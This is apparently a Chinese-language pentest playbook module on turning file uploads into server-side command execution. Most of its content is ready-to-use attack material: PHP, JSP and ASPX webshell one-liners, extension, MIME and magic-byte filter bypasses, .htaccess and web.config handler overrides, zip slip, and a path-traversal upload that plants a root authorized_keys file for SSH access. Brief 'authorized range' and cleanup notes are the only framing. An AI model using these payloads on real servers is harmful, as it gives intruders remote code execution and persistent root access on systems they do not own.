# 文件上传 → 服务器执行

> **TECH：** 把攻击者控制的文件写到 Web 可解释或可包含的位置  
> **成功：** 访问后是 **命令执行结果**，或配置已被改成会解释该文件  
> **不算：** HTTP 200、能传 jpg、只拿到下载链接  
> **GATES：** 知道 Web 栈（IIS / Apache / Nginx / Tomcat / Node）。后缀过滤 / MIME / 魔数 = 仍留 Web，不是 `/edr-bypass`。落地脚本被 AV 隔离才交接。

先看 `/web-recon` 的 Server / 语言 / 上传点 / 能否回读路径。不要默认 `.phtml`。

---

## 1. 判断

```text
能定位 URL 吗？
访问是执行结果，还是源码/附件下载？
不能执行 → 能否被 LFI 包含、改 handler、zip slip、写 authorized_keys？
```

验证：

```bash
curl -sS 'http://TARGET/uploads/shell.EXT?cmd=id'
# 必须看到 uid= 或 Windows whoami，不能只看 200
```

---

## 2. 与语言无关

```text
Content-Type 改成 image/png
文件头 GIF89a / PNG 魔数后再接脚本
双扩展 shell.aspx.jpg / shell.php.png
大小写 .AsPx / .pHp
filename* = UTF-8''shell.aspx
空字节只对极老栈，不要当 2026 默认
```

过滤过了但解释器不跑 = 还没成功。换栈专节或组合链。

---

## 3. PHP / Apache

```text
.php .phtml .phar .php5 .php7 .pHp
shell.php.jpg
GIF89a;<?php system($_GET['c']); ?>
exiftool -Comment='<?php system($_GET["c"]); ?>' img.jpg
```

.htaccess（高 IMPACT，RESTORE 删文件）：

```
AddType application/x-httpd-php .jpg
```

再传含 PHP 的 jpg。Nginx 通常不吃这个，不要对 Nginx 死磕 htaccess。

---

## 4. IIS / ASP.NET

```text
.aspx .ashx .asmx .cer .asa .asp
分号截断（老 IIS）：shell.asp;.jpg
web.config 改 handler（高 IMPACT）
PUT / WebDAV（OPTIONS 看是否允许）
```

最小 aspx 验证（授权靶场）：

```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c whoami") != null); %>
```

更稳：用 Kali `/usr/share/webshells/aspx/cmdasp.aspx`。验证：

```bash
curl -sS 'http://TARGET/uploads/cmdasp.aspx'
```

`web.config` 把某扩展映射到 aspnet（改前备份）：

```xml
<?xml version="1.0"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="x" path="*.config" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>
```

RESTORE：还原/删除该 `web.config`。失败且进程被杀 → `/edr-bypass` 后换落地路径再传。

---

## 5. Java / Tomcat

```text
.jsp .jspx .war
必须落到 webapps / 已部署应用可执行目录
只进 downloads/ 或 OSS = 不是 getshell
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

Kali：`/usr/share/webshells/jsp/`。war 能部署则打 manager 或写 `webapps/`。验证 curl 出执行结果。

---

## 6. Node / Python

默认 **不会** 把上传的 `.js` / `.py` 当入口执行。

能打：被 `require`/`import` 的目录、模板目录、uwsgi spool、可写的 server 启动脚本。  
否则：当不可执行文件，配 `lfi-rfi.md` / `ssti.md`，不要假装一传就 RCE。

---

## 7. 不是 getshell

SVG / HTML / PDF → XSS，转 `xss.md`。不要和 RCE 混。

---

## 8. 组合（往往比再找后缀值钱）

```text
不可执行文件 + LFI 包含
zip / 解压路径穿越（zip slip）写到 webroot 或 ssh
覆盖 nginx snippet / web.config
filename="../../../root/.ssh/authorized_keys"
```

authorized_keys：

```bash
ssh-keygen -f fileup -N ''
# 上传时改 filename 为 authorized_keys 路径
ssh -i fileup root@TARGET
```

RESTORE：删 shell、还原配置、从 authorized_keys 去掉公钥。
